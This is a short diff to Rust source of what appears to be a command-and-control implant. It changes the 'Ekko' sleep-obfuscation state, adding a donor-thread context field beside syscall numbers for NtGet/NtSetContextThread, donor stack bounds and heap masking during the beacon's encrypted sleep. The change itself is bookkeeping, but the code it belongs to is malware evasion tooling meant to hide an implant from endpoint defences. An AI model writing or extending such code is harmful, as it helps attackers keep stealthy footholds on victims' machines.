@@ -164,11 +164,14 @@ pub struct EkkoState {
     /// SSNs of NtGet/NtSetContextThread from the syscall table.
     pub get_ctx_ssn: u32,
     pub set_ctx_ssn: u32,
-    /// Donor thread: handle, exit event and its captured TIB bounds.
+    /// Donor thread: handle, exit event, its captured TIB bounds and its
+    /// heap-resident bootstrap block (masked with the private heap during
+    /// the encrypted window).
     pub h_donor: isize,
     pub h_donor_exit: isize,
     pub donor_stack_base: usize,
     pub donor_stack_limit: usize,
+    pub donor_ctx: usize,
     /// False = indirect dispatch refused (CFG enforced, missing exports,
     /// worker off the stub page, no donor): the beacon sleeps through the
     /// stub directly on its own thread.
@@ -369,6 +372,7 @@ impl EkkoState {
             h_donor_exit: 0,
             donor_stack_base: 0,
             donor_stack_limit: 0,
+            donor_ctx: 0,
             pool_ok: false,
         }
     }
@@ -414,6 +418,7 @@ pub unsafe fn init(
         h_donor_exit: 0,
         donor_stack_base: 0,
         donor_stack_limit: 0,
+        donor_ctx: 0,
         pool_ok: false,
     };
     use specter_core::peb;
@@ -592,6 +597,7 @@ pub unsafe fn init(
     st.h_donor_exit = h_exit;
     st.donor_stack_base = (*dc).stack_base;
     st.donor_stack_limit = (*dc).stack_limit;
+    st.donor_ctx = dc as usize;
     st.pool_ok = true;
     log_handle(dbg, b"sm: ekko ok\n");
     st
